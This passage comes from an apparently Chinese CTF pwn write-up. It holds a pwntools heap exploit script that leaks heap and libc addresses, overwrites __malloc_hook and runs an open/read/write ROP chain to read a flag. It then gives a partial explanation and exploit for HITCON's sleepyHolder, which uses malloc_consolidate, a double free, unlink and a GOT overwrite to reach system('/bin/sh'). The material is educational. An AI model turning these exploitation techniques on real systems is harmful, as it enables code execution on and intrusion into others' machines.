menu_add <span class="token operator">=</span> <span class="token number">1</span>
add_index_words <span class="token operator">=</span> <span class="token string">'idx: '</span>
add_size_words <span class="token operator">=</span> <span class="token string">''</span>
add_content_words <span class="token operator">=</span> <span class="token string">'name: '</span>

menu_del <span class="token operator">=</span> <span class="token number">4</span>
del_index_words <span class="token operator">=</span> <span class="token string">'idx: '</span>

menu_show <span class="token operator">=</span> <span class="token number">3</span>
show_index_words <span class="token operator">=</span> <span class="token string">'idx: '</span>

menu_edit <span class="token operator">=</span> <span class="token number">2</span>
edit_index_words <span class="token operator">=</span> <span class="token string">'idx: '</span>
edit_size_words <span class="token operator">=</span> <span class="token string">''</span>
edit_content_words <span class="token operator">=</span> <span class="token string">'name: '</span>

menu_malloc <span class="token operator">=</span><span class="token number">50056</span>
<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_add<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>add_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_del<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> del_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>del_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_show<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> show_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>show_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_edit<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>edit_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">malloc</span><span class="token punctuation">(</span>content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_malloc<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">leak_info</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    output_log <span class="token operator">=</span> <span class="token string">'&#123;&#125; => &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    all_logs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
    success<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
<span class="token comment"># debug()</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x90</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
show<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'hero name: '</span><span class="token punctuation">)</span>
heap_base<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xfffffffff000</span>
leak_info<span class="token punctuation">(</span><span class="token string">'heap_base'</span><span class="token punctuation">,</span>heap_base<span class="token punctuation">)</span>  

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x400</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span> 
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x400</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'b'</span><span class="token operator">*</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token comment">#防止合并</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
show<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x1e4ca0</span>
leak_info<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>
malloc_hook <span class="token operator">=</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'c'</span><span class="token operator">*</span><span class="token number">0x360</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'd'</span><span class="token operator">*</span><span class="token number">0xb0</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'e'</span><span class="token operator">*</span><span class="token number">0x400</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'f'</span><span class="token operator">*</span><span class="token number">0xc0</span><span class="token punctuation">)</span><span class="token comment">#防止合并</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'g'</span><span class="token operator">*</span><span class="token number">0x360</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'h'</span><span class="token operator">*</span><span class="token number">0xb0</span><span class="token punctuation">)</span>


<span class="token comment">#利用到0x220大小chunk</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'i'</span><span class="token operator">*</span><span class="token number">0x217</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>


payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x360</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x25f0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x30</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token comment">#-5稳定为0x7f</span>
edit<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>content<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token comment">#修改第二个smallbin的bk，</span>

add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'b'</span><span class="token operator">*</span><span class="token number">0x90</span><span class="token punctuation">)</span>

add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'./flag\x00'</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0xc8</span><span class="token punctuation">)</span><span class="token comment">#存放要打开的文件名 heap+0x2fc0，顺便用于存放flag的值heap+0x2fd0</span>
<span class="token comment"># add(index=1,content=b'\x00'*0xf0)#存放gadgets用于执行rop#错误的，堆上没有可执行权限，rop在栈上进行</span>

malloc<span class="token punctuation">(</span>content<span class="token operator">=</span><span class="token string">b'j'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token punctuation">)</span>
add_rsp_0x48<span class="token operator">=</span><span class="token number">0x08cfd6</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address
malloc<span class="token punctuation">(</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span>add_rsp_0x48<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># pause()</span>

pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x026542</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address
pop_rsi_ret<span class="token operator">=</span> <span class="token number">0x026f9e</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address
pop_rdx_ret <span class="token operator">=</span> <span class="token number">0x12bda6</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address
pop_rax_ret <span class="token operator">=</span> <span class="token number">0x047cf8</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address
syscall_ret <span class="token operator">=</span> <span class="token number">0x0cf6c5</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address
payload<span class="token operator">=</span>p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x2fc0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span><span class="token comment">#open</span>
payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x2fd0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span><span class="token comment">#read</span>
payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x2fd0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span><span class="token comment">#write</span>
debug<span class="token punctuation">(</span><span class="token string">'b *__malloc_hook'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>content<span class="token operator">=</span>payload<span class="token punctuation">)</span>
pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
a<span class="token operator">=</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>


<span class="token comment"># pause()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>最开始做的时候，是想的把__malloc_hook改为存放rop的堆上的，但不行，不知道为啥。</p>
<p>看了一下，如果这样做，在call __malloc_hook的时候会变成，不太懂了</p>
<p><img src="/images/v2-ba20a865513f50180470f284425e5440_720w.png" alt="img"></p>
<h2 id="24-BUU-sleepyHolder-hitcon-2016（malloc-consolidate利用，unlink）"><a href="#24-BUU-sleepyHolder-hitcon-2016（malloc-consolidate利用，unlink）" class="headerlink" title="24.BUU sleepyHolder_hitcon_2016（malloc_consolidate利用，unlink）"></a>24.BUU sleepyHolder_hitcon_2016（malloc_consolidate利用，unlink）</h2><p>一道2.23下的malloc_consolidate利用加unlink题目，也挺有意思的，看一下，没开PIE，可以改got表，很可能就是打unlink</p>
<p><img src="/images/v2-d0dd4d93af8bc930cf2a0d15d9fa72c7_720w.png" alt="img"></p>
<p>菜单题，最开始做了一个random的malloc，没什么用</p>
<p><img src="/images/v2-bde74c2e2a2b6acc8f59fcb682cc0b5c_720w.png" alt="img"></p>
<p>add中有三种可以添加的chunk，一种small，0x28，在fastbin大小中，第二章big吗，大小为0xFA0，第三种为huge，大小为0x61a80，且通过bss上的flag来控制是否能添加，只能添加一次，且通过calloc进行分配，不过这里没什么用。</p>
<p><img src="/images/v2-b5143077206ddf15e77ad771ce6b68f4_720w.png" alt="img"></p>
<p>delete函数，存在double free，但因为flag的控制无法uaf，且按照正常逻辑无法申请两个相同大小的chunk，无法做fastbin的double free</p>
<p><img src="/images/v2-7cc9647a1121a93932e58c8ad9c7651f_720w.png" alt="img"></p>
<p>edit，通过flag控制，所以无法UAF</p>
<p><img src="/images/v2-261d91d499fd897cf686584483b19574_720w.png" alt="img"></p>
<p>整体的结构就是这样，每一种大小的chunk只能分配一次，且无法利用double free，该如何来做，因为不会，所以看了网上的wp，大概懂了，首先需要知道：malloc_consolidate() 函数是定义在malloc.c 中的一个函数，<strong>用于将fastbin 中的空闲chunk 合并整理到unsorted_bin 中以及进行初始化堆的工作，而在申请一个bin链中找不到合适的，且大于top chunk时，就会调用这个函数对fastbin进行合并并把下一个chunk的prev_inuser置零。</strong>这就是利用的点，huge chunk足够大，就会触发这个功能，而我们知道，fastbin在执行free的时候仅验证了main_arena直接指向的块，即链表指针头部的块。对于链表后面的块并没有进行验证<strong>。且不会对fastbi以外的bin进行检查。</strong></p>
<p>所以这道题目的思路就是，先释放small chunk到fastbin，通过申请huge chunk，调用malloc_consolidate()让其进入unsortbin（这个申请还会让其从unsortbin进入smallbin），这样再释放一次small chunk，就会进入fastbin，从而造成了doublefree，再将其add，构造fake chunk，通过释放在申请small chunk后申请的big chunk，实现unlink，就是正常的unlink打法，可以改got表啦。</p>
<p>记录一下关键步骤：</p>
<p>通过malloc_consolidate进入smallbin</p>
<p><img src="/images/v2-c1210592d3921ff20255bd24c971ad8c_720w.png" alt="img"></p>
<p><img src="/images/v2-f43590a029c66d3e8748ff5c138698df_720w.png" alt="img"></p>
<p>构造fakechunk并触发unlink</p>
<p><img src="/images/v2-46afc59d600ab93557e9586f194d5c5e_720w.png" alt="img"></p>
<p><img src="/images/v2-5e49902c3676419f8621aaea786e49f2_720w.png" alt="img"></p>
<p>打一个system，这里有一个点，最开始想打system，但不知道该把/bin/sh 写到哪，就尝试打了one_gadgets，但没打通（看别人wp是通了），后来实在看别人的方法是unlink的时候把/bin/sh写到free_got的上面，也能修改free_got，同时还把/bin/sh放到了small chunk里，就可以打了，算是一个小trick。</p>
<p><img src="/images/v2-80e01f17ba3360bf0e5d20dfc565242a_720w.png" alt="img"></p>
<p><img src="/images/v2-c7604d5a4581177ba4ecb780ee4852d3_720w.png" alt="img"></p>
<p>给出exp:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#from ae64 import AE64</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll

filename <span class="token operator">=</span> <span class="token string">'./pwn'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'neww'</span><span class="token punctuation">]</span>
local <span class="token operator">=</span> <span class="token number">1</span>
all_logs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    sh <span class="token operator">=</span> process<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node5.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">26608</span> <span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>parma<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> an_log <span class="token keyword">in</span> all_logs<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>an_log<span class="token punctuation">)</span>
    pid <span class="token operator">=</span> util<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>pid<span class="token punctuation">,</span>parma<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

choice_words <span class="token operator">=</span> <span class="token string">'Renew secret'</span>

menu_add <span class="token operator">=</span> <span class="token number">1</span>
add_index_words <span class="token operator">=</span> <span class="token string">'Big secret'</span>
add_index_words1 <span class="token operator">=</span> <span class="token string">'forever'</span>
add_size_words <span class="token operator">=</span> <span class="token string">''</span>
add_content_words <span class="token operator">=</span> <span class="token string">'secret: '</span>
flag_huge <span class="token operator">=</span> <span class="token number">0</span>


menu_del <span class="token operator">=</span> <span class="token number">2</span>
del_index_words <span class="token operator">=</span> <span class="token string">'Big secret'</span>

menu_show <span class="token operator">=</span> <span class="token number">33</span>
show_index_words <span class="token operator">=</span> <span class="token string">'Idx: '</span>

menu_edit <span class="token operator">=</span> <span class="token number">3</span>
edit_index_words <span class="token operator">=</span> <span class="token string">'Big secret'</span>
edit_size_words <span class="token operator">=</span> <span class="token string">''</span>
edit_content_words <span class="token operator">=</span> <span class="token string">'secret: '</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_add<span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    <span class="token keyword">if</span> flag_huge<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_index_words1<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> flag_huge<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>add_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_del<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> del_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>del_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_show<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> show_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>show_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_edit<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_index_words<span class="token punctuation">:</span>
